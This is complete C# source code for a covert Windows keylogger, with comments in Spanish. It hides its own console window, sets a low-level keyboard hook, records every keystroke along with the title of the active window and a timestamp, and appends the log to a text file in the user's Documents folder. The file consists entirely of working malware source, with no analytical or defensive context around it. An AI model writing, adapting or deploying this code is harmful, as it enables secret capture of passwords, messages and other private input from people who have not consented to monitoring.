using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

class KeyLogger
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    private static StreamWriter logWriter;
    private static string lastWindowTitle = "";

    [STAThread]
    static void Main()
    {
        IntPtr handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        string logPath = Path.Combine(documentsPath, "log.txt");

        logWriter = new StreamWriter(new FileStream(logPath, FileMode.Append, FileAccess.Write))
        {
            AutoFlush = true
        };

        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
        logWriter.Close();
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);

            // Detectar cambio de ventana activa
            IntPtr hWnd = GetForegroundWindow();
            StringBuilder winBuffer = new StringBuilder(256);
            GetWindowText(hWnd, winBuffer, 256);
            string currentWindowTitle = winBuffer.ToString();

            if (currentWindowTitle != lastWindowTitle)
            {
                lastWindowTitle = currentWindowTitle;
                string time = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                logWriter.WriteLine();
                logWriter.WriteLine("[" + time + "] Ventana: " + currentWindowTitle);
            }

            // Preparar keyState para ToUnicodeEx
            byte[] keyState = new byte[256];
            GetKeyboardState(keyState);

            if ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0)
                keyState[VK_SHIFT] = 0x80;

            if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
                keyState[VK_CAPITAL] = 0x01;

            if ((GetAsyncKeyState(VK_RMENU) & 0x8000) != 0) // AltGr
            {
                keyState[VK_RMENU] = 0x80;
                keyState[VK_MENU] = 0x80;
                keyState[VK_CONTROL] = 0x80;
            }

            IntPtr layout = GetKeyboardLayout(0);
            StringBuilder buffer = new StringBuilder(5);
            int result = ToUnicodeEx((uint)vkCode, 0, keyState, buffer, buffer.Capacity, 0, layout);

            string key;
            string raw = buffer.ToString();

            if (result > 0 && !string.IsNullOrWhiteSpace(raw))
            {
                if (char.IsControl(raw[0]) || (int)raw[0] == 0xFFFF)
                {
                    key = MapKnownKey(vkCode);
                }
                else if (char.IsLetter(raw[0]))
                {
                    bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                    bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

                    if (!shift && !caps && char.IsUpper(raw[0]))
                        key = raw.ToLower();
                    else
                        key = raw;
                }
                else
                {
                    key = raw;
                }
            }
            else
            {
                key = MapKnownKey(vkCode);
            }

            logWriter.Write(key);
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static string MapKnownKey(int vkCode)
    {
        switch (vkCode)
        {
            case 160:
            case 161: return "[SHIFT]";
            case 162:
            case 163: return "[CTRL]";
            case 164: return "[ALT]";
            case 165: return "[ALTGR]";
            case 20: return "[CAPSLOCK]";
            case 13: return "[ENTER]\n";
            case 9: return "[TAB]";
            case 27: return "[ESC]";
            case 8: return "[BACKSPACE]";
            case 32: return "[SPACE]";
            case 222: return "´";
            case 192: return "^";
            case 219: return "[";
            case 221: return "]";
            case 220: return "\\";
            case 186: return "ñ";
            case 187: return "=";
            case 189: return "-";
            case 188: return ",";
            case 190: return ".";
            case 191: return "?";
            case 44: return "[PrintScreen]";
            default:
                try
                {
                    return "[" + ((Keys)vkCode).ToString() + "]";
                }
                catch
                {
                    return "[UNK-" + vkCode + "]";
                }
        }
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
        IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    [DllImport("user32.dll")]
    private static extern short GetKeyState(int nVirtKey);

    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
        uint wVirtKey,
        uint wScanCode,
        byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
        int cchBuff,
        uint wFlags,
        IntPtr dwhkl);

    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);

    private const int SW_HIDE = 0;
    private const int VK_SHIFT = 0x10;
    private const int VK_CAPITAL = 0x14;
    private const int VK_MENU = 0x12;
    private const int VK_CONTROL = 0x11;
    private const int VK_RMENU = 0xA5;
}
